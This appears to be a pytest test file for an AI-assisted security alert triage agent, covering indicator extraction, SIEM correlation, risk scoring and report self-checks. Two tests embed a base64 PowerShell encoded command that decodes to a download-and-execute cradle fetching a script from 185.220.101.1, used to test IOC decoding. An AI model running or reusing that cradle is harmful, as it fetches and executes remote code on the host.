import logging
from datetime import datetime, timezone
from uuid import uuid4

from app.agent.schemas import (
    ClaimAudit,
    CorrelationDecision,
    DraftReportCanonical,
    DraftReportExperimental,
    ExtractedIndicators,
    IndicatorCandidate,
    OpenValueSearchProposal,
    PatternType,
    RecommendedAction,
    SearchTemplate,
    SelfCheckResult,
    TriageVerdict,
)
from app.agent.state_graph import AgenticAnalyst, Step
from app.enrichment.registry import EnrichmentRegistry
from app.integration.errors import SIEMConnectorError
from app.integration.models import AgentContext, RuleMetadata, SearchResult
from app.llm.errors import LLMClientError
from app.schemas import AgentRef, Alert, EnrichmentResult, InvestigationStep
from app.schemas import EnrichmentVerdict, IndicatorType
from app.schemas import AlertStatus, Confidence, ReportStatus, RiskAssessment, Severity
from app.storage.db import get_engine, init_db
from app.storage.sqlite_alert_store import SQLiteAlertStore


class _FakeSIEMConnector:
    def __init__(self, agent_context=None, rule_metadata=None, context_error=None, search_results=None):
        self._agent_context = agent_context
        self._rule_metadata = rule_metadata
        self._context_error = context_error
        self._search_results = search_results or {}  # {field_name: SearchResult}
        self.search_calls = []

    def health_check(self):
        return True

    def pull_alerts(self, since, until=None, limit=500):
        return []

    def search(self, query):
        self.search_calls.append(query)
        # Keyed by the first clause's field — sufficient for these tests, since each
        # canonical/follow-up query in this phase has a distinguishable primary field.
        field = query.clauses[0].field
        return self._search_results.get(field, SearchResult(alerts=[], total_count=0))

    def get_agent_context(self, agent_id):
        if self._context_error is not None:
            raise self._context_error
        return self._agent_context

    def get_rule_metadata(self, rule_id):
        if self._context_error is not None:
            raise self._context_error
        return self._rule_metadata


class _FakeAlertStore:
    def __init__(self):
        self.reports = []
        self.status_updates = []

    def save_raw_alert(self, alert):
        return str(alert.alert_id)

    def get_alert(self, alert_id):
        raise NotImplementedError

    def list_alerts(self, status=None, since=None, limit=100):
        return []

    def update_alert_status(self, alert_id, status):
        self.status_updates.append((alert_id, status))

    def save_report(self, report):
        self.reports.append(report)
        return str(report.report_id)

    def get_report(self, report_id):
        raise NotImplementedError

    def get_report_for_alert(self, alert_id):
        return None

    def list_reports(self, since=None, min_severity=None):
        return []


class _FakeLLMClient:
    def __init__(self, model_available=True, responses=None, error=None):
        self._model_available = model_available
        self._responses = responses or {}  # {schema_class: return_value}
        self._error = error
        self.calls: list[tuple[str, type]] = []

    def generate_structured(self, prompt, schema):
        self.calls.append((prompt, schema))
        if self._error is not None:
            raise self._error
        if schema in self._responses:
            return self._responses[schema]
        raise NotImplementedError(f"no canned response configured for {schema}")

    def health_check(self):
        return True

    def model_available(self):
        return self._model_available


def test_fake_llm_client_records_prompt_and_schema_per_call():
    client = _FakeLLMClient(responses={RiskAssessment: RiskAssessment(
        severity=Severity.LOW, confidence=Confidence.LOW, rationale="x"
    )})

    client.generate_structured("first prompt", RiskAssessment)
    client.generate_structured("second prompt", RiskAssessment)

    assert client.calls == [("first prompt", RiskAssessment), ("second prompt", RiskAssessment)]


def _make_alert(**overrides):
    defaults = dict(
        alert_id=uuid4(),
        source_alert_id="1699999999.123456",
        source_system="wazuh",
        rule_id="5710",
        rule_description="sshd: Attempt to login using a non-existent user",
        rule_level=5,
        timestamp=datetime.now(timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        agent=AgentRef(id="001", name="web-01", ip="10.0.0.5"),
        manager_name="wazuh-manager",
        location="/var/log/auth.log",
        full_log="Invalid user admin from 203.0.113.5",
        raw_json={"rule": {"id": "5710"}},
    )
    defaults.update(overrides)
    return Alert(**defaults)


def _make_analyst(**overrides):
    defaults = dict(
        siem=_FakeSIEMConnector(),
        alert_store=_FakeAlertStore(),
        enrichment_registry=EnrichmentRegistry(),
        llm_client=_FakeLLMClient(),
    )
    defaults.update(overrides)
    return AgenticAnalyst(**defaults)


def test_step_ingest_and_parse_records_model_available_true():
    analyst = _make_analyst()
    alert = _make_alert()

    step = analyst._step_ingest_and_parse(alert, model_available=True)

    assert step.step_name == Step.INGEST_AND_PARSE.value
    assert step.action == "completed"
    assert str(alert.alert_id) in step.output_summary
    assert "model available: True" in step.output_summary


def test_step_ingest_and_parse_records_model_available_false():
    analyst = _make_analyst()
    alert = _make_alert()

    step = analyst._step_ingest_and_parse(alert, model_available=False)

    assert "model available: False" in step.output_summary


class _FakeIPProvider:
    provider_id = "abuseipdb"
    supported_types = frozenset({IndicatorType.IP})

    def __init__(self, result):
        self._result = result

    def lookup(self, indicator):
        return self._result


def _make_enrichment_result(**overrides):
    defaults = dict(
        indicator_type=IndicatorType.IP,
        indicator_value="203.0.113.5",
        provider_id="abuseipdb",
        queried_at=datetime.now(timezone.utc),
        verdict=EnrichmentVerdict.CLEAN,
        score=1.0,
        cache_expires_at=datetime.now(timezone.utc),
    )
    defaults.update(overrides)
    return EnrichmentResult(**defaults)


def test_step_extract_indicators_finds_and_validates_ip():
    analyst = _make_analyst()
    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")

    indicators, _, step = analyst._step_extract_indicators(alert, model_available=False)

    assert len(indicators) == 1
    assert indicators[0].value == "203.0.113.5"
    assert step.step_name == Step.EXTRACT_INDICATORS.value
    assert "regex: 1 candidates, 1 validated" in step.output_summary


def test_step_extract_indicators_returns_empty_list_when_nothing_found():
    analyst = _make_analyst()
    alert = _make_alert(full_log="nothing interesting here")

    indicators, _, step = analyst._step_extract_indicators(alert, model_available=False)

    assert indicators == []
    assert step.action == "completed"


def test_step_extract_indicators_skips_llm_when_model_unavailable():
    analyst = _make_analyst()
    alert = _make_alert(full_log="nothing interesting here")

    _, _, step = analyst._step_extract_indicators(alert, model_available=False)

    assert "LLM-assisted extraction skipped: model unavailable" in step.output_summary


def test_step_extract_indicators_merges_llm_candidates_with_regex_results():
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            ExtractedIndicators: ExtractedIndicators(
                candidates=[IndicatorCandidate(type=IndicatorType.DOMAIN, value="evil.test")]
            )
        },
    )
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")

    indicators, _, step = analyst._step_extract_indicators(alert, model_available=True)

    values = {i.value for i in indicators}
    assert values == {"203.0.113.5", "evil.test"}
    assert "LLM: 1 candidates, 1 validated" in step.output_summary


def test_step_extract_indicators_discards_invalid_llm_candidates():
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            ExtractedIndicators: ExtractedIndicators(
                candidates=[IndicatorCandidate(type=IndicatorType.IP, value="not-an-ip")]
            )
        },
    )
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert(full_log="nothing interesting here")

    indicators, _, step = analyst._step_extract_indicators(alert, model_available=True)

    assert indicators == []
    assert "LLM: 1 candidates, 0 validated" in step.output_summary


def test_step_extract_indicators_keeps_regex_results_when_llm_call_fails():
    llm_client = _FakeLLMClient(model_available=True, error=LLMClientError("timeout", "took too long"))
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")

    indicators, _, step = analyst._step_extract_indicators(alert, model_available=True)

    assert len(indicators) == 1
    assert indicators[0].value == "203.0.113.5"
    assert "LLM-assisted extraction failed: timeout" in step.output_summary


def test_step_extract_indicators_decodes_and_extracts_ioc_from_encoded_command():
    from app.schemas import ProcessExecutionFields

    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
    analyst = _make_analyst()
    alert = _make_alert(
        full_log="",
        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
    )

    indicators, command_decode_result, step = analyst._step_extract_indicators(alert, model_available=False)

    assert any(i.value == "185.220.101.1" for i in indicators)
    assert command_decode_result is not None
    assert len(command_decode_result.decoded_segments) == 1
    assert "command decode: 1 segment(s) decoded, 0 discarded" in step.output_summary


def test_step_extract_indicators_passes_decoded_command_text_to_llm_extraction_prompt():
    """A defanged IOC hidden inside an encoded blob (e.g. hxxp://185[.]220[.]101[.]1)
    must reach the LLM-assisted extractor's prompt via the decoded segments, not just
    the regex path, since the LLM extractor is the only one that can de-obfuscate
    defanged formatting."""
    from app.schemas import ProcessExecutionFields

    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={ExtractedIndicators: ExtractedIndicators(candidates=[])},
    )
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert(
        full_log="",
        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
    )

    analyst._step_extract_indicators(alert, model_available=True)

    extract_calls = [prompt for prompt, schema in llm_client.calls if schema is ExtractedIndicators]
    assert len(extract_calls) == 1
    # "185.220.101.1" alone also appears in the prompt template's boilerplate example text,
    # so assert on the decoded payload's distinctive substring instead.
    assert "a.ps1" in extract_calls[0]


def test_step_extract_indicators_returns_none_command_decode_result_when_no_process_fields():
    analyst = _make_analyst()
    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")

    _, command_decode_result, _ = analyst._step_extract_indicators(alert, model_available=False)

    assert command_decode_result is None


def test_step_enrich_calls_registry_for_each_indicator():
    registry = EnrichmentRegistry()
    registry.register(_FakeIPProvider(result=_make_enrichment_result()))
    analyst = _make_analyst(enrichment_registry=registry)
    indicators, _, _ = analyst._step_extract_indicators(
        _make_alert(full_log="Invalid user admin from 203.0.113.5"), model_available=False
    )

    results, step = analyst._step_enrich(indicators)

    assert len(results) == 1
    assert results[0].verdict == EnrichmentVerdict.CLEAN
    assert step.step_name == Step.ENRICH.value
    assert step.action == "completed"


def test_step_enrich_skips_when_no_indicators():
    analyst = _make_analyst()

    results, step = analyst._step_enrich([])

    assert results == []
    assert step.action == "skipped"
    assert "no validated indicators" in step.output_summary


def test_step_gather_context_returns_context_on_success():
    siem = _FakeSIEMConnector(
        agent_context=AgentContext(id="001", name="web-01", ip="10.0.0.5", status="active"),
        rule_metadata=RuleMetadata(rule_id="5710", description="x", level=5),
    )
    analyst = _make_analyst(siem=siem)
    alert = _make_alert()

    agent_context, rule_metadata, step = analyst._step_gather_context(alert)

    assert agent_context.id == "001"
    assert rule_metadata.rule_id == "5710"
    assert step.step_name == Step.GATHER_CONTEXT.value
    assert step.action == "completed"


def test_step_gather_context_degrades_on_siem_connector_error():
    siem = _FakeSIEMConnector(context_error=SIEMConnectorError("unreachable", "connection refused"))
    analyst = _make_analyst(siem=siem)
    alert = _make_alert()

    agent_context, rule_metadata, step = analyst._step_gather_context(alert)

    assert agent_context is None
    assert rule_metadata is None
    assert step.action == "degraded"
    assert "unreachable" in step.output_summary


def test_run_canonical_searches_sums_evidence_count_across_all_three():
    siem = _FakeSIEMConnector(
        search_results={
            "data.srcip": SearchResult(alerts=[], total_count=3),
            "rule.id": SearchResult(alerts=[], total_count=5),
            "data.dstip": SearchResult(alerts=[], total_count=2),
        }
    )
    analyst = _make_analyst(siem=siem)
    alert = _make_alert(source_ip="203.0.113.5", destination_ip="198.51.100.9")

    queries, results, evidence_count, failed_count = analyst._run_canonical_searches(alert)

    assert evidence_count == 10
    assert len(results) == 3
    assert failed_count == 0


def test_run_canonical_searches_skips_missing_fields():
    siem = _FakeSIEMConnector(search_results={"rule.id": SearchResult(alerts=[], total_count=4)})
    analyst = _make_analyst(siem=siem)
    alert = _make_alert(source_ip=None, destination_ip=None)

    queries, results, evidence_count, failed_count = analyst._run_canonical_searches(alert)

    assert evidence_count == 4
    assert SearchTemplate.SAME_SRC_IP_24H not in results
    assert SearchTemplate.SAME_DST_HOST not in results
    assert SearchTemplate.SAME_RULE_ID_HOST in results
    assert failed_count == 0


def test_run_canonical_searches_degrades_when_a_search_raises():
    siem = _FakeSIEMConnector(search_results={"rule.id": SearchResult(alerts=[], total_count=5)})
    siem.search = lambda query: (_ for _ in ()).throw(SIEMConnectorError("unreachable", "indexer down")) \
        if query.clauses[0].field == "data.srcip" else SearchResult(alerts=[], total_count=5)
    analyst = _make_analyst(siem=siem)
    alert = _make_alert(source_ip="203.0.113.5", destination_ip=None)

    queries, results, evidence_count, failed_count = analyst._run_canonical_searches(alert)

    assert failed_count == 1
    assert SearchTemplate.SAME_SRC_IP_24H not in results
    assert SearchTemplate.SAME_RULE_ID_HOST in results
    assert evidence_count == 5


def test_step_correlate_reports_failed_canonical_searches_without_crashing():
    siem = _FakeSIEMConnector()

    def _raising_search(query):
        raise SIEMConnectorError("unreachable", "indexer down")

    siem.search = _raising_search
    analyst = _make_analyst(siem=siem)
    alert = _make_alert(source_ip=None, destination_ip=None)

    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=False)

    assert step.action == "completed"
    assert evidence_count == 0
    assert "1 canonical search(es) failed" in step.output_summary


def test_step_correlate_runs_searches_and_skips_classification_when_model_unavailable():
    siem = _FakeSIEMConnector(search_results={"rule.id": SearchResult(alerts=[], total_count=7)})
    analyst = _make_analyst(siem=siem)
    alert = _make_alert(source_ip=None, destination_ip=None)

    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=False)

    assert pattern_type == PatternType.OTHER
    assert evidence_count == 7
    assert step.step_name == Step.CORRELATE.value
    assert "classification skipped: model unavailable" in step.output_summary


def test_step_correlate_classifies_pattern_and_runs_follow_up_query():
    siem = _FakeSIEMConnector(
        search_results={
            "data.srcip": SearchResult(alerts=[], total_count=14),
            "rule.id": SearchResult(alerts=[], total_count=14),
        }
    )
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            CorrelationDecision: CorrelationDecision(
                pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.SAME_SRC_IP_24H
            )
        },
    )
    analyst = _make_analyst(siem=siem, llm_client=llm_client)
    alert = _make_alert(source_ip="203.0.113.5", destination_ip=None)

    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=True)

    assert pattern_type == PatternType.BRUTE_FORCE
    # base evidence (14 from rule_id canonical search, source_ip canonical search also 14) + the
    # follow-up re-running the same same_src_ip_24h query, adding another 14
    assert evidence_count == 14 + 14 + 14
    assert "pattern_type=brute_force" in step.output_summary
    assert "same_src_ip_24h" in step.output_summary


def test_step_correlate_skips_follow_up_when_none_needed():
    siem = _FakeSIEMConnector(search_results={"rule.id": SearchResult(alerts=[], total_count=1)})
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            # NOTE: uses BRUTE_FORCE (not NONE/OTHER) so this test — which is only about
            # follow-up-query skip logic — isn't coupled to Task 7's open-value-search path.
            CorrelationDecision: CorrelationDecision(
                pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.NONE_NEEDED
            )
        },
    )
    analyst = _make_analyst(siem=siem, llm_client=llm_client)
    alert = _make_alert(source_ip=None, destination_ip=None)

    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=True)

    assert pattern_type == PatternType.BRUTE_FORCE
    assert evidence_count == 1
    assert len(siem.search_calls) == 1  # only the one canonical search — no follow-up executed


def test_step_correlate_falls_back_to_other_when_classification_call_fails():
    siem = _FakeSIEMConnector(search_results={"rule.id": SearchResult(alerts=[], total_count=2)})
    llm_client = _FakeLLMClient(model_available=True, error=LLMClientError("timeout", "took too long"))
    analyst = _make_analyst(siem=siem, llm_client=llm_client)
    alert = _make_alert(source_ip=None, destination_ip=None)

    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=True)

    assert pattern_type == PatternType.OTHER
    assert evidence_count == 2


def test_step_correlate_runs_open_value_search_when_pattern_is_none():
    siem = _FakeSIEMConnector(
        search_results={
            "rule.id": SearchResult(alerts=[], total_count=1),
            "full_log": SearchResult(alerts=[], total_count=3),
        }
    )
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            CorrelationDecision: CorrelationDecision(
                pattern_type=PatternType.NONE, follow_up_query=SearchTemplate.NONE_NEEDED
            ),
            OpenValueSearchProposal: OpenValueSearchProposal(search_value="admin@evil.test"),
        },
    )
    analyst = _make_analyst(siem=siem, llm_client=llm_client)
    alert = _make_alert(source_ip=None, destination_ip=None)

    pattern_type, evidence_count, step = analyst._step_correlate(alert, model_available=True)

    assert pattern_type == PatternType.NONE
    assert "noisier, unstructured match" in step.output_summary
    assert "admin@evil.test" in step.output_summary
    full_log_calls = [c for c in siem.search_calls if c.clauses[0].field == "full_log"]
    assert len(full_log_calls) == 1
    assert full_log_calls[0].clauses[0].operator == "contains"


def test_step_correlate_skips_open_value_search_when_pattern_is_identified():
    siem = _FakeSIEMConnector(search_results={"rule.id": SearchResult(alerts=[], total_count=1)})
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            CorrelationDecision: CorrelationDecision(
                pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.NONE_NEEDED
            )
        },
    )
    analyst = _make_analyst(siem=siem, llm_client=llm_client)
    alert = _make_alert(source_ip=None, destination_ip=None)

    _, _, step = analyst._step_correlate(alert, model_available=True)

    assert "noisier" not in step.output_summary
    assert all(c.clauses[0].field != "full_log" for c in siem.search_calls)


def test_step_correlate_skips_open_value_search_when_proposal_call_fails():
    class _SequencedLLMClient:
        def __init__(self):
            self.calls = 0

        def generate_structured(self, prompt, schema):
            self.calls += 1
            if schema is CorrelationDecision:
                return CorrelationDecision(pattern_type=PatternType.OTHER, follow_up_query=SearchTemplate.NONE_NEEDED)
            raise LLMClientError("timeout", "took too long")

        def health_check(self):
            return True

        def model_available(self):
            return True

    siem = _FakeSIEMConnector(search_results={"rule.id": SearchResult(alerts=[], total_count=1)})
    analyst = _make_analyst(siem=siem, llm_client=_SequencedLLMClient())
    alert = _make_alert(source_ip=None, destination_ip=None)

    _, _, step = analyst._step_correlate(alert, model_available=True)

    assert "noisier" not in step.output_summary


def test_correlation_decision_prompt_includes_command_line_template():
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            CorrelationDecision: CorrelationDecision(pattern_type=PatternType.OTHER, follow_up_query=SearchTemplate.NONE_NEEDED)
        },
    )
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()

    analyst._classify_correlation(alert, {}, 0)

    prompt = llm_client.calls[0][0]
    assert "same_command_line_env_wide" in prompt


def test_run_open_value_search_logs_proposal_and_siem_result(caplog):
    siem = _FakeSIEMConnector(search_results={"full_log": SearchResult(alerts=[], total_count=5)})
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            OpenValueSearchProposal: OpenValueSearchProposal(search_value="admin@evil.test")
        },
    )
    analyst = _make_analyst(siem=siem, llm_client=llm_client)
    alert = _make_alert()
    canonical_results = {}

    with caplog.at_level(logging.DEBUG, logger="app.agent.state_graph"):
        result = analyst._run_open_value_search(alert, canonical_results)

    assert "_run_open_value_search prompt" in caplog.text
    assert "_run_open_value_search result" in caplog.text
    assert "_run_open_value_search: SIEM search for" in caplog.text
    assert "admin@evil.test" in caplog.text
    assert "5" in caplog.text
    assert "noisier, unstructured match" in result


def test_step_risk_assessment_returns_real_assessment():
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            RiskAssessment: RiskAssessment(
                severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="matches known malicious IP"
            )
        },
    )
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()

    assessment, step = analyst._step_risk_assessment(
        alert, PatternType.BRUTE_FORCE, 14, [], model_available=True
    )

    assert assessment.severity == Severity.HIGH
    assert assessment.confidence == Confidence.HIGH
    assert step.step_name == Step.RISK_ASSESSMENT.value
    assert step.action == "completed"
    assert "severity=high" in step.output_summary


def test_step_risk_assessment_skips_when_model_unavailable():
    analyst = _make_analyst()
    alert = _make_alert()

    assessment, step = analyst._step_risk_assessment(
        alert, PatternType.OTHER, 0, [], model_available=False
    )

    assert assessment.severity == Severity.LOW
    assert assessment.confidence == Confidence.LOW
    assert step.action == "skipped"


def test_step_risk_assessment_falls_back_on_llm_error():
    llm_client = _FakeLLMClient(model_available=True, error=LLMClientError("timeout", "took too long"))
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()

    assessment, step = analyst._step_risk_assessment(
        alert, PatternType.OTHER, 0, [], model_available=True
    )

    assert assessment.severity == Severity.LOW
    assert assessment.confidence == Confidence.LOW
    assert "risk assessment failed: timeout" in assessment.rationale


def test_step_risk_assessment_logs_prompt_and_result(caplog):
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            RiskAssessment: RiskAssessment(
                severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="matches known malicious IP"
            )
        },
    )
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()

    with caplog.at_level(logging.DEBUG, logger="app.agent.state_graph"):
        analyst._step_risk_assessment(alert, PatternType.BRUTE_FORCE, 14, [], model_available=True)

    assert "_step_risk_assessment input" in caplog.text
    assert "_assess_risk prompt" in caplog.text
    assert alert.rule_id in caplog.text
    assert "_assess_risk result" in caplog.text
    assert "matches known malicious IP" in caplog.text


def test_step_risk_assessment_passes_command_context_to_prompt():
    from app.schemas import CommandDecodeResult, DecodedSegment

    command_context = CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami http://185.220.101.1")],
    )
    llm_client = _FakeLLMClient(responses={
        RiskAssessment: RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()

    analyst._step_risk_assessment(alert, PatternType.OTHER, 0, [], model_available=True, command_context=command_context)

    assert "185.220.101.1" in llm_client.calls[0][0]


def test_step_draft_report_returns_canonical_and_experimental_drafts():
    draft_canonical = DraftReportCanonical(
        alert_summary="Brute-force attempts from 203.0.113.5.",
        rationale="Repeated failed logins against a single account.",
        recommended_actions=[RecommendedAction.BLOCK_SOURCE_IP],
    )
    draft_experimental = DraftReportExperimental(
        recommended_actions_freeform=["Consider geo-blocking"],
        triage_verdict=TriageVerdict.TRUE_POSITIVE,
        triage_rationale="Matches known brute-force pattern.",
    )
    llm_client = _FakeLLMClient(responses={
        DraftReportCanonical: draft_canonical,
        DraftReportExperimental: draft_experimental,
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    draft, experimental, step = analyst._step_draft_report(
        alert, PatternType.BRUTE_FORCE, 14, [], risk_assessment, model_available=True
    )

    assert draft == draft_canonical
    assert experimental == draft_experimental
    assert step.step_name == Step.DRAFT_REPORT.value
    assert step.action == "completed"


def test_step_draft_report_falls_back_when_canonical_call_fails():
    llm_client = _FakeLLMClient(error=LLMClientError("timeout", "took too long"))
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="Original step-6 rationale text.")

    draft, experimental, step = analyst._step_draft_report(
        alert, PatternType.OTHER, 0, [], risk_assessment, model_available=True
    )

    assert draft.recommended_actions == [RecommendedAction.ESCALATE_TO_HUMAN_ANALYST]
    assert draft.rationale == "Original step-6 rationale text."
    assert experimental is None
    assert "draft report failed: timeout" in analyst._degraded_reasons[0]


def test_step_draft_report_skips_when_model_unavailable():
    analyst = _make_analyst()
    alert = _make_alert(rule_id="5710", rule_description="sshd brute force", rule_level=10)

    draft, experimental, step = analyst._step_draft_report(
        alert, PatternType.OTHER, 0, [], RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x"),
        model_available=False,
    )

    assert "5710" in draft.alert_summary
    assert draft.recommended_actions == [RecommendedAction.ESCALATE_TO_HUMAN_ANALYST]
    assert experimental is None
    assert step.action == "skipped"


def test_draft_canonical_prompt_contains_pattern_type_and_evidence_count():
    llm_client = _FakeLLMClient(responses={
        DraftReportCanonical: DraftReportCanonical(
            alert_summary="x", rationale="y", recommended_actions=[RecommendedAction.MONITOR_NO_ACTION]
        ),
        DraftReportExperimental: DraftReportExperimental(
            recommended_actions_freeform=[], triage_verdict=TriageVerdict.UNCERTAIN, triage_rationale="z"
        ),
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.MEDIUM, confidence=Confidence.MEDIUM, rationale="w")

    analyst._step_draft_report(alert, PatternType.SCANNING, 7, [], risk_assessment, model_available=True)

    canonical_prompt = next(p for p, schema in llm_client.calls if schema is DraftReportCanonical)
    assert "scanning" in canonical_prompt
    assert "7" in canonical_prompt


def test_step_draft_report_passes_command_context_to_prompts():
    from app.schemas import CommandDecodeResult, DecodedSegment

    command_context = CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami http://185.220.101.1")],
    )
    llm_client = _FakeLLMClient(responses={
        DraftReportCanonical: DraftReportCanonical(
            alert_summary="x", rationale="y", recommended_actions=[RecommendedAction.MONITOR_NO_ACTION]
        ),
        DraftReportExperimental: DraftReportExperimental(
            recommended_actions_freeform=[], triage_verdict=TriageVerdict.UNCERTAIN, triage_rationale="z"
        ),
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    analyst._step_draft_report(
        alert, PatternType.OTHER, 0, [], risk_assessment, model_available=True, command_context=command_context
    )

    canonical_prompt = next(p for p, schema in llm_client.calls if schema is DraftReportCanonical)
    experimental_prompt = next(p for p, schema in llm_client.calls if schema is DraftReportExperimental)
    assert "185.220.101.1" in canonical_prompt
    assert "185.220.101.1" in experimental_prompt


def _draft_with_two_actions():
    return DraftReportCanonical(
        alert_summary="Brute-force attempts from 203.0.113.5.",
        rationale="Repeated failed logins against a single account.",
        recommended_actions=[RecommendedAction.BLOCK_SOURCE_IP, RecommendedAction.DISABLE_OR_RESET_ACCOUNT],
    )


def _passthrough_correlate_step():
    return InvestigationStep(
        step_name=Step.CORRELATE.value, action="completed", tool_used="siem_connector+llm", input=None,
        output_summary="pattern_type=brute_force, evidence_count=14",
        timestamp=datetime.now(timezone.utc),
    )


def test_step_self_check_keeps_all_claims_when_all_supported():
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    assert corrected == draft
    # No claims were flagged, but `_passthrough_correlate_step()` has no "follow-up"/"open-value
    # search" text and `_make_alert()` defaults `mitre` to None, so `_compute_uncertainty_notes`
    # still reports those two structural gaps (see test_step_self_check_notes_unused_correlation_menu
    # and test_step_self_check_notes_missing_mitre_mapping for the same behavior in isolation).
    assert notes == (
        "correlation follow-up/open-value search menu was not used; "
        "no MITRE ATT&CK mapping available for this alert"
    )
    assert step.action == "completed"


def test_step_self_check_applies_correction_to_unsupported_free_text_claim():
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=False, correction="Corrected summary text."),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    assert corrected.alert_summary == "Corrected summary text."
    assert corrected.recommended_actions == draft.recommended_actions


def test_step_self_check_drops_unsupported_action_without_using_its_correction():
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=False, correction="Do something else instead"),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    corrected, notes, step = analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True,
    )

    assert corrected.recommended_actions == [RecommendedAction.DISABLE_OR_RESET_ACCOUNT]
    assert "Do something else instead" not in [a.value for a in corrected.recommended_actions]
